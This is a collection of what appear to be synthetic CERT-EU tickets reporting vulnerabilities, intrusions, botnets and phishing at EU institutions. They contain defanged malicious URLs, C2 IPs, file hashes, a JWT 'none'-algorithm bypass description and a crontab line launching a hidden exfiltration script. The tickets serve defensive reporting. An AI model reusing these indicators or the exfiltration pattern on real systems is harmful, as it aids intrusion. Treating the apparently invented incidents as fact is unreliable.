We have identified a critical flaw in the JWT signature verification logic of the eProcurement Gateway (gateway.procure-eu.eu), which is widely used by multiple EU agencies for supplier onboarding and contract management.\n\nSummary of findings:\nDuring a code review and black-box testing of the authentication flow, we discovered that the backend service at https://gateway.procure-eu.eu/api/auth/validate-token is accepting JWTs signed with the 'none' algorithm, effectively bypassing signature verification. Our PoC demonstrates that an attacker can craft arbitrary tokens with elevated roles (e.g., 'admin', 'procurement_manager') and gain unauthorized access to restricted endpoints, including supplier data exports and tender submission panels.\n\nImpact:\n- Full account takeover is possible for any registered user, including high-privilege roles.\n- Sensitive procurement documents and supplier PII are exposed.\n- Potential for fraudulent tender submissions and data tampering.\n\nWe have not attempted to access or modify any actual data, and all tests were performed against our own test accounts. However, the vulnerability appears present in both production and pre-production environments. Attached you will find a sanitized PoC (Python script), screenshots of the modified JWT payloads, and HTTP response headers confirming unauthorized access.\n\nDisclosure preferences:\nWe are submitting this report under the CERT-EU Coordinated Vulnerability Disclosure policy. Our team requests a standard 90-day window before any public disclosure. We are available for further technical clarification and can assist with remediation validation if needed.\n\nPlease confirm receipt and let us know if additional information is required.

I\u2019m not a technical person, but our analysts flagged some odd traffic between internal endpoints and a cluster of external domains that don\u2019t resolve to anything public and seem to follow a repeating subdomain pattern (e.g., c8s4j3q2l1.authsync-update[.]net, x2y7k9d8a5.authsync-update[.]net, etc.).\n\nThe pattern started last Thursday (11/07) and continues sporadically\u2014peaking during off-hours, mostly from two endpoints used by our policy drafting team (MOJ-WS-112, MOJ-WS-119). We\u2019ve seen around 6,000 outbound DNS queries in short bursts, each with unique subdomains but always to the same root domain. Endpoint AV (Sophos Intercept X) didn\u2019t find anything malicious, but our Splunk queries show matching spikes in PowerShell activity and unexpected svchost.exe network calls. We haven\u2019t found any direct file transfers or obvious C2 traffic in firewall logs, but there\u2019s a nagging concern about covert exfiltration or initial beaconing.\n\nOur local TI feed didn\u2019t turn up much, and VirusTotal returns are inconclusive\u2014none of these domains have previous reputation data. I\u2019m attaching a CSV with a sample of the DNS queries and timestamps.

The test window opened as scheduled on June 17th, and we\u2019ve so far focused on enumerating exposed API methods and validating authentication controls. \n\nInitial testing revealed that several non-documented endpoints (e.g., /internalCaseExport and /auditTrailQuery) are accessible with standard user tokens. While we have not yet identified direct privilege escalation vectors, we did manage to retrieve limited metadata from /auditTrailQuery without triggering any alerts on the SIEM. We are preparing detailed request/response logs for your review.\n\nWe\u2019ve also observed inconsistent rate limiting enforcement. In particular, the /caseSearch endpoint allowed over 400 requests per minute from a single IP (our test VM at 145.14.89.27) before any throttling occurred. This could potentially be leveraged for enumeration or denial-of-service attacks. Please confirm if this rate is expected in production, or if there are additional controls in place we should be aware of.\n\nWe have not attempted any mutation operations or destructive testing yet, pending your confirmation on acceptable test boundaries. Let us know if you\u2019d like us to proceed with fuzzing or injection attempts on the /caseUpdate mutation, or if there are endpoints to explicitly exclude.\n\nPlease advise on the above points at your earliest convenience, so we can adjust our approach for the remainder of the test window (ending June 24th).

{"ticket_id": "TKT-B6216A19", "title": "Public Exposure of Executable File Uploads on edoc.eca.europa.eu: Request for CERT-EU Guidance Following Internal Discovery", "content": "Hi CERT-EU Vulnerability Disclosure Team,\n\nI\u2019m forwarding this on behalf of our IT Helpdesk at the European Court of Auditors (ECA) \u2013 not a technical expert myself (I work mostly on process improvement), but this came up in a ticket that looked potentially serious. I\u2019m hoping you can advise on whether this warrants urgent triage.\n\nYesterday morning, several colleagues in the Audit Tools & Data Services group reported errors when uploading supporting documents to our internal eDoc platform (hosted at edoc.eca.europa.eu). Our tech team initially thought it was a quota issue, but after some digging, they noticed that uploaded files with specific extensions\u2014most notably .ps1 and .exe\u2014were not just accepted but actually appeared in a public test directory accessible without authentication at edoc.eca.europa.eu/test-uploads/ (I\u2019ve double-checked and can confirm access from a standard networked device, no VPN).\n\nWhat\u2019s odd (and concerning) is that these files can be downloaded and executed by anyone with the link. The Helpdesk traced it to a recent update of the document management plugin, which apparently added a \u2018test\u2019 mode for development but failed to restrict access to internal users or admin roles. Our internal security policy mandates that all file uploads undergo strict validation and that only whitelisted formats (PDF, DOCX, XLSX, etc.) are accepted\u2014clearly, this bypasses those controls.\n\nI am attaching a short log extract (see attached: edoc_upload_log_eca.txt) showing upload attempts and subsequent GET requests from various IPs. While I\u2019m not qualified to confirm, it seems possible that this exposes us to arbitrary file upload and execution vulnerabilities, especially if the server is not properly sandboxed (I\u2019ll leave the technical assessment to your specialists). We have not seen evidence of exploitation, but it is unclear how long the \u2018test-uploads\u2019 folder has been publicly accessible. The IT Helpdesk says this was discovered after a user accidentally uploaded a script file instead of a report and noticed it was immediately available at the public URL.\n\nWe have since disabled the plugin and blocked access to the affected directory at the firewall level, but we wanted to follow CERT-EU CVD policy and get your view on next steps, especially regarding coordinated disclosure and any obligation to notify other stakeholders. We\u2019d appreciate guidance on what additional evidence or analysis might be helpful\u2014again, I\u2019m not the best person for deep technical investigation but can facilitate contact with the IT Helpdesk or our in-house cybersecurity consultant if you need more details.\n\nLet me know if you require any more info or direct access to the affected environment for further validation.\n\nBest regards,\n\nAna\u00efs Leclerc\nProcess Improvement Officer\nEuropean Court of Auditors\na.leclerc@eca.europa.eu", "created_date": "2025-01-08T00:00:00", "email_address": "a.leclerc@eca.europa.eu", "assigned_queue": "OFFSEC::CVD"}

Over the last two weeks, our SOC flagged a cluster of outbound connections to an unfamiliar C2 infrastructure, mostly from endpoints within our Justice and Migration units.

During routine monitoring following a recent SaaS integration outage, our team identified a misconfiguration in the OAuth 2.0 implementation used by our internal project management and communications platforms\u2014specifically, Atlassian JIRA Cloud and Google Workspace.\n\nThe incident began on 18 June 2024 at approximately 09:30 CET, when several users reported intermittent access failures to both JIRA and Google Meet. Initial remediation steps (service restarts and cache clearing) restored functionality. However, subsequent analysis of authentication logs and SSO (Single Sign-On) token exchanges revealed that the affected services were accepting tokens issued to unintended client IDs, due to a misconfigured trust relationship in the Identity Provider (IdP) settings. This potentially allowed for privilege escalation between federated SaaS tools if an attacker was able to obtain or forge a valid token from another trusted client.\n\nNo evidence of malicious exploitation has been detected at this stage, but the risk profile is non-trivial, as lateral movement between SaaS platforms could expose sensitive EU project data or communications. The misconfiguration appears to have been introduced during a routine update to the IdP integration scripts on 14 June 2024. We have attached relevant authentication logs (with PII redacted) and a summary of the IdP configuration for your review.\n\nIn accordance with the CERT-EU Coordinated Vulnerability Disclosure policy and NIS2 requirements, we request guidance on further investigation steps, as well as recommendations for responsible notification to affected SaaS vendors.

Over the past 72 hours, we\u2019ve observed anomalous activity affecting several government-hosted NextCloud servers in Baden-W\u00fcrttemberg and Lower Saxony. Our telemetry (see attached STIX2 file) shows a spike in suspicious POST requests to /index.php/core/ajax/update.php, originating from a cluster of IPs registered to a small Bulgarian hosting provider (full list in attachment). The requests began at 03:24 CET on 27 July and have continued at irregular intervals since.\n\nWhat concerns us most is the apparent use of an unknown exploit chain. The initial compromise appears to leverage a flaw not yet catalogued in public CVE databases \u2013 attempts to replicate the behavior in a test environment with fully patched instances have so far been unsuccessful. Once access is gained, the attackers deploy a PHP-based dropper (SHA256: 49b7c8b2e1d7d35d9a9e1fd6d12b7b8a2c6f2d9e3a0e4f8c7b7e5d1c9a8b7f6c), which then fetches a second-stage payload from hxxps://cloudsync-node[.]bg-nethub[.]org/updates/taskmgr.bin.\n\nPost-compromise, we\u2019ve detected lateral movement attempts targeting adjacent PostgreSQL and LDAP services, as well as exfiltration of user lists and group shares. The TTPs show overlap with those previously documented in the \"Silver Clover\" campaign (per BSI CTI bulletin #2024-07-12), but the infrastructure and exploit methodology differ. We have a moderate confidence assessment that this may represent a new capability under active development by a yet-unattributed actor.\n\nFor context: no ransom demands or destructive actions have been observed. However, the targeting pattern suggests reconnaissance of document repositories linked to regional infrastructure projects. We\u2019re still analyzing packet captures for C2 traffic, but so far, exfiltrated data appears to be limited to CSV dumps and config files.\n\nWe would appreciate:\n- Any sightings of similar exploit attempts or the attached indicators in your environments\n- Insights into recent NextCloud-targeted zero-days or related actor activity\n- Recommendations for additional detection logic, especially for obfuscated PHP droppers\n\nApologies for any formatting oddities\u2014this is a rush forward from the IR team as we try to keep pace.

Upon further investigation, we identified a potential open redirect vulnerability affecting the campaign redirector endpoint (e.g., /redirect?target=).\n\nSpecifically, it appears that the endpoint fails to adequately validate user-supplied URLs, allowing attackers to craft links that redirect visitors to arbitrary external domains.

The email, which appears to be a reply to a previous (but non-existent) invoice discussion, was received this morning at 09:12 CEST by one of our junior finance officers. The sender claims to represent a regular vendor (Energix Solutions GmbH), but the email address used (billing@energix-invoice[.]eu) does not match the official domain we have on file for them.\n\nThe message subject line reads: \"Re: Invoice #38746 \u2013 Payment Reminder\". The body of the email references an overdue payment for services allegedly rendered in May, and attaches a PDF file named 'Energix_Invoice_May2024.pdf'. The tone is assertive, urging us to process the payment within 24 hours to avoid 'service disruption.' There are a few oddities in the text, such as inconsistent formatting and a generic closing ('Finance Dept. \u2013 Energix Solutions'), but no direct threats.\n\nI asked our team not to open the attachment or reply until we verified its authenticity. The original email includes a footer with what looks like a VAT number, but it doesn\u2019t match the vendor records in our procurement system (SAP S/4HANA). I\u2019ve defanged the sender\u2019s address and attached a screenshot of the message headers for your analysis. The attachment was not opened, but we have quarantined it and can provide it securely if needed.\n\nThis is the first time we\u2019ve seen this particular sender and invoice number. No other staff have reported similar emails so far, but our team is concerned as the timing coincides with our quarterly payments cycle, and the message references real project codes (though slightly altered from our usual format). I suspect this may be a targeted attempt at invoice fraud or business email compromise, possibly using scraped information from previous public tender announcements.\n\nCould you please review the attached header screenshot and advise on next steps? Should we notify other Bundestag departments or EU partner institutions if this turns out to be part of a broader phishing campaign? Also, is there any specific IOC we should search for in our mail logs?\n\nThank you for your assistance and please let me know if you need the original .eml file or the quarantined PDF for deeper analysis.\n\nBest regards,\n\nSvenja M\u00fcller\nAccounts Payable Supervisor\nFinance Department\nDeutscher Bundestag\nsvenja.muller@bundestag.de\n+49 30 227 12345", "created_date": "2024-11-30T00:00:00", "email_address": "svenja.muller@bundestag.de", "assigned_queue": "DFIR::phishing"}

This engagement was initiated as part of our routine pre-production security validation and to ensure alignment with GDPR and NIS2 requirements before the upcoming public launch.\n\nDuring the active testing window (scheduled 10\u201314 June), our team detected that several campaign automation features abruptly ceased functioning, specifically those reliant on third-party API integrations. Notably, the Firebase-backed event logging and analytics components are no longer capturing campaign performance data. This outage was first observed on 11 June at 09:45 CET and has impacted both test and staging environments (cmp-staging.europarl.europa.eu).\n\nInitial investigation suggests that certain penetration test payloads may have triggered unexpected behaviour in the backend API authentication mechanisms, potentially causing a denial of service or misconfiguration in Firebase's access controls. No evidence of data leakage or unauthorised access has been identified so far, but campaign metrics and event logs for all test users are missing since the incident.\n\nWe have attached relevant application logs and a summary of the test payloads used (see: cmp-pentest-logs_20240611.zip) to assist your analysis. Please advise whether any additional controls or temporary exclusions are recommended for third-party integrations during the remainder of the assessment.

I am forwarding this on behalf of our analysis group at CERT Polska following a recent alert from our regional partners in Lower Silesia. We have identified what appears to be a new wave of botnet command and control (C2) infrastructure, currently leveraging a fast-flux network targeting several municipal government endpoints across Poland and, we suspect, other EU member states.\n\nInitial detection was triggered by anomalous outbound connections on port 443 to clusters of dynamic domains (see attached CSV, TLP:GREEN). The domains include but are not limited to: citynet-secure[.]ru, municipaldata[.]click, and govservices-backup[.]org. Our DNS telemetry indicates rapid IP rotation, with resolved addresses falling under AS20473 and AS9002. Related C2 nodes: 185.233.186.102, 91.200.12.58 (no prior listing in Feodo Tracker as of 18/06/2024).\n\nWe have observed infected hosts beaconing with HTTP POST payloads resembling encoded device inventory dumps. The infection vector remains unclear, but initial reverse engineering suggests use of a previously undocumented loader (SHA256: b2e8a4cf9dd5b901fd9b13e4ac1c8f5eac2e9b99e07c91e3d71a71298d5e63c7). There is some code overlap with the \"Herakles\" botnet reported by ENISA last year, but significant divergence in network protocol. MITRE ATT&CK mapping aligns with T1095 (Non-Application Layer Protocol) and T1001.003 (Data Obfuscation: Protocol Impersonation).\n\nWe are still in the process of correlating this activity with any known campaigns or actor groups.

We\u2019ve been seeing a steady uptick in credential phishing attempts against staff and students over the last 10 days, but what\u2019s weird is the clustering of sender infrastructure and the rapid domain turnover. Our local analysis (see attached IOC_export_20240621.csv) shows 12 unique domains and 7 IPs (mainly in the 185.245.x.x and 91.207.x.x ranges) all resolving to hosting providers in Moldova and Romania. Most of these domains were registered in the last two weeks and are using Let\u2019s Encrypt certificates, which makes detection harder on our end.\n\nWe believe the campaign is leveraging a new variant of the \"SpearHarbor\" phishing kit, which we haven\u2019t seen before in our constituency. The kit is using HTML smuggling (MITRE ATT&CK T1027.002) to bypass email gateway filtering and drops a zipped JS payload that attempts to steal O365 and EduGain SSO credentials. We have attached a sample of the payload and full headers (see: spearharbor_sample.zip, password: eu-acad2024). Notably, the kit rotates landing pages every 6-8 hours and uses random subdomains (e.g., mail-login-auth[.]eu-acad-help[.]org, support-verify[.]univsec[.]net).\n\nWe\u2019re flagging this as urgent because at least three partner universities in the Netherlands and Germany have reported similar attacks, and our MISP instance shows cross-hits with indicators from a recent ENISA flash alert (TLP:AMBER). Attribution is still low confidence, but there are some overlaps with infrastructure previously linked to the \"OrionGroup\" actor cluster (per MISP event #12894).\n\nCould you help with:\n- Correlating our IOCs with any ongoing campaigns or actor profiles in your datasets?\n- Advising on additional detection rules for HTML smuggling and domain rotation?\n- Sharing any relevant advisories or enrichment on \"SpearHarbor\" kit evolution?\n\nLet me know if you need raw mail logs or want to set up a call with our SOC.

The attempts originated from IP ranges registered to two different academic institutions in the Netherlands and Spain (IPs included in the attached CSV).

However, the SSH keys used in the successful logins don\u2019t match any of our issued credentials, which is raising some eyebrows here. The vendor\u2019s analysis suggests the TTPs could align with brute-force SSH attacks mapped to MITRE ATT&CK T1110.001, but they also flagged the session timings as consistent with previous botnet-related lateral movement.

Earlier this morning, our SIEM (Splunk) flagged several anomalous outbound connections originating from node db-node-04.sec.eurostat.eu, part of our internal statistics database cluster. The activity began at 04:37 CET and persisted for roughly 18 minutes. Specifically, we observed a sustained SFTP session from the host to an external IP (37.252.185.99) not whitelisted in our egress policies. The session transferred approximately 1.2GB of compressed data, filename observed in the logs as \"tmp_xstat_archive_0626.tar.gz\".\n\nThe source process appears to be /usr/bin/sftp, launched under the service account 'svc_dbexport'. This account should only have local backup permissions and is not configured for interactive sessions or external transfers. A check of our scheduled jobs (cron, systemd timers) shows no legitimate export tasks at that hour.

The source internal IP (10.22.5.15) is assigned to our application server, but the transfer was initiated externally. We're investigating possible credential theft or pivoting from the app server. As of now, we\u2019ve disabled the svc_dbexport account, blocked outbound traffic to the suspect IP, and begun collecting forensic images of db-node-04 and the application server.\n\nNo alerts have fired on our EDR agents (Trend Micro Apex One), but we did notice a new SSH key added to svc_dbexport's ~/.ssh/authorized_keys at 03:51, which we cannot account for. No legitimate admin logged this change. We're preserving logs and snapshots for your review.\n\nThis cluster contains non-public EU statistical data, including several datasets marked RESTRICTED.

Our network monitoring and honeypots have identified an uptick in volumetric attacks originating from a distributed set of compromised IoT devices (mainly CCTV and smart signage), leveraging open telnet/SSH ports and weak credentials.\n\nKey findings:\n- Command and control servers: 188.165.35[.]220, 51.68.204[.]113 (latest beacon activity: 2024-07-03 23:41 UTC)\n- Botnet malware sample: SHA256 29af31f9b9b7b41b23a2e1c6a2f22d8f8d8d3cfb6c8e2f2c75b67e3d8a4f6e90\n- TTPs observed: Automated credential stuffing (T1110.003), fast-flux C2 hosting, rapid C2 IP rotation (see attached CSV for last 48h)\n\nWe\u2019ve mapped overlap with older \"Mirai-like\" codebases but note distinct traffic signatures and hardcoded admin panels at hxxp://panel-frost[.]site. Our analysis suggests possible expansion to EU-wide targets, with traffic hints seen towards .be and .es public infrastructure.\n\nWe would appreciate:\n- Any enrichment or sightings of these C2s across other EU constituencies\n- Input on takedown or sinkholing coordination (legal/technical hurdles?)\n- Updates on related botnet disruption attempts or known actor profiles\n\nApologies for the messy log formatting\u2014time pressure on our end.

Over the past 48 hours, several users have reported persistent issues accessing the internal project reporting dashboard (hosted on our secure intranet). Initially, we suspected a backend database (MySQL) misconfiguration or resource constraint, as the dashboard intermittently fails to load, sometimes returning generic connection errors. Standard remediation steps\u2014such as server restarts and application log review (Ruby on Rails stack)\u2014did not resolve the issue, and nothing conclusive was found in the syslog or database logs.\n\nUpon closer examination, we observed a sequence of unexpected outbound DNS queries originating from the dashboard server to an external domain (hxxps://dashsync-status[.]eu-west[.]cloud), which is not part of our legitimate application dependencies. The timing of these queries coincides with the onset of user-facing disruptions. Additionally, netstat revealed multiple short-lived connections to external IPs in the 145.239.94[.]0/24 range, which, according to several open source CTI feeds, has recently been linked to C2 infrastructure leveraged in data exfiltration campaigns targeting European public sector entities. No clear evidence of direct database tampering or obvious webshell artifacts has been found so far, but some log entries (attached) display anomalous API request patterns reminiscent of known TTPs for lateral movement (possible MITRE ATT&CK T1046: Network Service Scanning).\n\nGiven the above, and in the context of ongoing regional increases in infrastructure-targeted attacks, we are treating this as an ongoing investigation with potential critical implications. We would appreciate your assistance with the following:\n\n1. Cross-reference the attached indicators (external domain, IPs, suspicious API log entries) with any current CTI on infrastructure targeting or C2 activity impacting EU entities.\n2. Any insights into potential actor attribution, campaign codenames, or related IOCs would be valuable. Please inform us if these TTPs align with recent campaigns (especially any involving dashboard or project management platforms in the EU sector).\n3. Recommendations for further containment, forensic collection, or telemetry to gather, in alignment with NIS2 requirements, would be greatly appreciated.\n\nPlease note that this is a routine\u2014but time-sensitive\u2014request, and we stand ready to provide any additional technical artifacts as needed.

Over the past week, we have observed anomalous outbound connections from several endpoints running the MedStat Pro platform (v4.8.2), which is widely used for clinical data processing across multiple EU agencies.\n\nPreliminary network analysis revealed periodic traffic to previously unknown domains (e.g., hxxps://data-sync[.]medstats-cloud[.]eu and hxxps://update-node[.]medstat-support[.]net), with communication patterns resembling known C2 frameworks. Our endpoint telemetry also flagged the presence of a suspicious DLL (SHA256: 9e3b4f7e0b7d...) loaded into the MedStat process space, first detected on 2024-06-14. This DLL does not match any known vendor updates and was delivered via an auto-update mechanism.\n\nWe suspect this may be linked to a broader campaign targeting EU healthcare supply chains, potentially leveraging T1195 (Supply Chain Compromise) and T1071 (Application Layer Protocol) per MITRE ATT&CK.

Our IT team has already reviewed standard troubleshooting steps\u2014server restarts, audit of application and database logs (including MongoDB and backend API traces), and permissions validation\u2014but these efforts have not resolved the issue. Notably, we have identified several anomalous API calls originating from a third-party plugin (vendor: ProTaskio, version 2.4.1) that was recently updated following a scheduled Chef deployment.\n\nUpon further inspection, our SIEM flagged a series of outbound requests from the application server to the following previously unseen domains: hxxps://sync-tasks[.]cloudsync[.]pro and hxxps://update-feed[.]taskplug[.]eu. These connections occurred shortly after the plugin update and do not correspond to any documented vendor endpoints. Preliminary YARA scans did not yield known malware signatures, but we did extract two suspicious SHA256 file hashes from temporary update files (see attached CSV).

Over the past 48 hours, we have observed a marked increase in failed authentication attempts targeting privileged user accounts, specifically those with administrative access to our internal campaign management system (host: comms-campaigns01.europarl.europa.eu).\n\nThe Security Operations Centre (SOC) first detected the anomaly via our SIEM (Splunk) on 17 June 2024 at 21:23 CET. The logs indicate repeated login failures for user 'admin_campaigneu' from external IP address 185.102.44.77, followed by a successful login from the same IP after 17 unsuccessful attempts. Notably, this activity occurred outside of standard working hours and was accompanied by a change in user agent string from the usual 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' to 'curl/7.68.0', suggesting possible scripted access. Please see attached [auth.log] extract for reference.\n\nDespite resetting the affected account's credentials and enforcing MFA, we have continued to see attempts from additional IPs (see: 37.187.98.11, 92.222.45.90), all geolocating outside the EU. We have also noted minor but unexplained changes to campaign configuration settings and audience targeting parameters, which may indicate malicious tampering or data reconnaissance. No evidence of data exfiltration has been found so far, but the incident remains under active investigation.\n\nWe request CERT-EU's assistance with forensic analysis of the affected account and related systems, as well as recommendations for further containment and remediation. We are prepared to provide additional logs, session tokens, and relevant metadata as needed. Please advise if immediate escalation to the Data Protection Officer is warranted under GDPR/NIS2.\n\nThank you for your prompt attention to this matter.

The issue arises from overly permissive default grants on system tables, combined with insufficient row-level security (RLS) policies. While we have not observed any malicious exploitation to date, this could potentially expose sensitive data attributes (e.g., patient IDs, admission dates) to staff accounts not intended to access such information.\n\nFor your reference, I have attached a sanitized SQL script demonstrating the enumeration vector, along with a summary of affected tables and our current RBAC configuration.

The engagement, as per our agreement, focuses on the resilience of the investment analytics platform prior to its integration with the broader EU financial data infrastructure.\n\nEarlier today, while attempting to deploy the test harness on the analytics gateway device (hostname: FIN-ANALYTICS-GW01), we encountered persistent connectivity failures. Specifically, our secure shell (SSH) sessions dropped intermittently, and data exfiltration simulations could not be completed due to unexplained device timeouts. Preliminary diagnostics suggest possible endpoint security agent interference or an incompatibility with the device's current firmware version (v3.2.4, last updated 2023-11-19). We have already tried the following troubleshooting steps:\n\n- Restarted the analytics gateway and verified physical network connections\n- Updated and reinstalled network interface drivers\n- Swapped between available network ports and tested alternate VLANs\n\nDespite these measures, the penetration testing toolkit fails to maintain a stable connection for more than a few minutes. We have attached relevant system logs (see: FIN-ANALYTICS-GW01-logs_20240612.zip) and a screenshot of the error messages observed during testing.\n\nGiven the urgency to complete the assessment before the platform's go-live deadline (June 30th), we kindly request your guidance on how to proceed.

Our DevOps group has just flagged a few irregularities that seem to have cropped up since the test began, and I\u2019d like to clarify if these are expected artefacts of your activities or if we should be concerned about possible misconfigurations on our end.\n\nSpecifically, our AWS CloudTrail logs have shown several failed authentication attempts against the admin console for the pharmacovigilance data lake (hosted in eu-west-1, account ID 749110293475). These attempts originated from the test IPs we whitelisted (52.56.102.99 and 18.203.88.12), so I\u2019m assuming this is part of your scenario. However, there was also a spike in S3 access denied errors on the \u2018ema-pharm-data-archive\u2019 bucket, which is supposed to be out of scope for this engagement per the agreed test plan. I\u2019ve attached a short extract from the logs (see: cloudtrail_extract_20240709.csv) for your reference.\n\nCould you please confirm whether any enumeration or privilege escalation tests were conducted on resources outside the \u2018pharm-dev\u2019 VPC? If so, we may need to review our segmentation controls and update the test scope to avoid triggering unnecessary alerts or impacting production workloads.\n\nAlso, our monitoring tools (CloudWatch and GuardDuty) have triggered several medium-severity findings related to API call patterns not previously observed\u2014happy to share more details if needed. Please advise if you require additional temporary permissions or if there\u2019s any other info we should provide to facilitate your assessment.\n\nAppreciate your quick feedback so we can keep our teams aligned and ensure the test runs smoothly.

As part of the agreed scenario, your operatives attempted physical entry via the main staff entrance this morning at 07:38. The guards followed protocol, challenged the team, and denied entry after verifying the badges were not on the pre-cleared list. All good so far.\n\nHowever, about 40 minutes later, our building access logs (from HID VertX controller) flagged a badge scan on the west loading dock entrance. The log shows badge ID 00-AC-92-17, which does not match any issued credentials. Simultaneously, a motion sensor alert triggered in the adjacent comms room (Room 2.14), and our environmental monitoring system registered a brief temperature spike (2.1\u00b0C increase over 5 min, see attached env_log_20240704.csv). Security patrol swept the area at 08:30 and reported nothing unusual.\n\nWe\u2019ve confirmed the access controller and sensor logs are genuine, and CCTV footage is inconclusive due to morning glare. No doors appear physically tampered with, and all sensitive areas are still locked down. No staff have reported issues, and operations are running normally. IT has checked for new wireless signals or rogue devices, but nothing stood out in the NetAlly AirCheck survey.\n\nCan you confirm if these events were part of your red team activities or if this could be an unrelated incident? We need to rule out the possibility of an opportunistic attempt piggybacking on the exercise. If it\u2019s your team, could you provide details on the badge emulation method and any physical testing tools used, so we can update our post-exercise review? If not, we may need to escalate this as a real incident and initiate a full security audit.\n\nPlease reply ASAP with clarification, as management is understandably concerned about potential overlap between simulated and real threats during live exercises.

These requests attempted to establish automated workflows via Airtable\u2019s API, targeting data fields related to ongoing legislative projects. Notably, the user-agents and request patterns deviate from our documented integration partners and appear to mimic legitimate business automation platforms (e.g., Zapier, Integromat), but with subtle discrepancies in header formatting and OAuth token usage.\n\nInitial analysis of network logs (attached, TLP:AMBER) indicates the following:\n- API calls originating from 195.22.134[.]77 and 62.210.246[.]19\n- Repeated attempts to enumerate table schemas and extract metadata\n- Use of suspicious integration keys not previously registered by our IT department\n\nWe are concerned this activity may be indicative of an ongoing reconnaissance phase by a threat actor seeking to exploit weak or misconfigured integrations within our project management stack. Given the potential exposure of sensitive legislative workflows and the increasing prevalence of supply chain attacks leveraging SaaS integrations (cf. NIS2 Article 21 requirements), we are treating this as a high-priority intelligence matter.\n\nRequest for CTI Support:\n1. Could you provide any recent intelligence on campaigns or actor groups known to target SaaS project management integrations within EU institutions?\n2.

This report is based on findings from our ongoing investigation as of 11 July 2024, following alerts triggered by our SIEM (Elastic Stack) and subsequent review by our IT security team.\n\nOn 10 July 2024 at approximately 21:10 CEST, multiple anomalous outbound connections were detected originating from the secure data storage node (host: hds-node07.sante.ec.europa.eu). The connections were established to external IP addresses (notably 162.247.74.201 and 185.220.101.7), which have been previously associated with anonymization networks (e.g., Tor exit nodes). These sessions involved significant data transfer volumes (approx. 2.8GB total) over a 17-minute window, using encrypted protocols (TLS 1.2, non-standard ports 8443 and 9443).\n\nReview of [syslog] and [auditd.log] indicates the process 'python3 /tmp/.hidden/backup_sync.py' was initiated under service account 'svc_hcdata', which should not have direct internet access. The script was not present in our approved software inventory and appears to have been dropped via a scheduled task created earlier that day (crontab entry: '22 20 * * * /tmp/.hidden/backup_sync.py'). No legitimate backup operations were scheduled at this time.\n\nPreliminary forensic analysis suggests unauthorized access to patient pseudonymization tables and related healthcare datasets, with export activity matching the outbound transfer timestamps. We have isolated the affected node from the network, revoked credentials for 'svc_hcdata', and are in the process of collecting full disk images for further review. Relevant log excerpts and a copy of the suspicious script (defanged) are attached for your analysis (see 'sante-hds-incident-20240710.zip').\n\nGiven the sensitivity of healthcare data and strict GDPR/NIS2 obligations, we require CERT-EU's assistance in deepening the forensic investigation, identifying the full scope of data accessed or exfiltrated, and providing guidance on notification and containment measures.

Subject line was: \u2018Confirm Your Attendance & Update Payment Info for EU Mobility Conference\u2019. \n\nIt says that I need to \u201cfinalise your attendance by updating your payment method and confirming your travel details.\u201d There\u2019s a blue button saying \u2018Update Registration\u2019 that points to a link (I didn\u2019t click!): hxxps://mobility-2024[.]eu-participant[.]online. The email itself is written in decent English but has a few odd wordings like \u2018Do not miss your priority slot for the upcoming event\u2019. They also listed a phone number that starts with +44 which doesn\u2019t make sense for an EU-hosted event in Belgium, right?\n\nI checked with our actual events team and they confirmed they haven\u2019t sent anything out today and the domain isn\u2019t theirs.

I am reaching out as the IT Systems Administrator for the Directorate-General for Communication at the European Commission regarding a recent security incident affecting our internal workflow automation platform, which is integral to our digital communications and outreach activities.\n\nYesterday afternoon (12 June 2024, approx. 15:30 CET), our SOC detected multiple anomalous authentication attempts targeting privileged accounts associated with our marketing automation system (host: comm-auto01.intra.ec.europa.eu). The SIEM flagged a series of failed logins originating from external IP 185.99.24.7, followed by a successful login for userID 'mktg_admin' outside normal working hours (18:22 CET). Shortly after, we observed suspicious API calls attempting to export large volumes of contact and campaign data, which may indicate potential data exfiltration activity.\n\nPreliminary investigation via EDR (CrowdStrike) revealed the presence of an unfamiliar PowerShell script executed under the compromised account, with outbound connections to hxxps://dl[.]marketing-sync[.]net. We have attached relevant Sysmon logs and EDR alerts for your review. No evidence of ransomware or destructive activity so far, but several key datasets appear to have been accessed.\n\nImmediate containment actions included disabling the affected account, blocking the identified IP addresses at the firewall, and isolating the impacted host from the internal network. We are currently conducting a wider audit of privileged account usage and reviewing access logs for related anomalies.\n\nGiven the sensitivity of the data involved (including personal data of EU citizens and external partners), we are treating this as a potential GDPR incident and are preparing a notification for the DPO. We would appreciate CERT-EU's assistance in forensic analysis, IOCs correlation, and guidance on further remediation steps. Please advise if additional information or artifacts are required from our side.\n\nThank you for your prompt attention to this matter.

Earlier today (15 July 2024, approx. 10:30 CET), several users, including myself, encountered persistent errors when attempting to upload project files to the platform (host: docshare.intra.ec.europa.eu). The error message was generic (\u201cUpload failed \u2013 please try again later\u201d), but what drew our attention was a series of unexpected authentication prompts and session timeouts, even after repeated browser restarts and cache clears.\n\nUpon preliminary review, our SOC detected a spike in failed upload attempts originating from multiple internal user accounts within a short timeframe. Concurrently, our SIEM (Splunk) flagged anomalous POST requests to the upload endpoint, some of which contained suspiciously large payloads and encoded parameters.

We are currently in the active testing phase, focusing on endpoint data integrity controls within our document management infrastructure.\n\nSpecifically, we have observed that synchronisation between several workstations equipped with encrypted SSDs (Samsung 870 EVO 1TB) and our SharePoint-based document repository is intermittently failing. This behaviour was first noticed after a recent Windows security update (KB5032452), and seems to primarily affect machines with the latest disk encryption policies enforced via BitLocker. Despite reverting affected systems and conducting standard troubleshooting (device reboots, policy refreshes), the issue persists and appears to impact the consistency of file replication across trusted nodes.\n\nWe are concerned that this may indicate an exploitable misconfiguration or a potential security control bypass that could undermine data integrity assurances. As part of our pentest engagement, we have captured relevant event logs, synchronisation error traces, and a network packet capture (see attached: EP_DocSync_PentestFindings.zip).

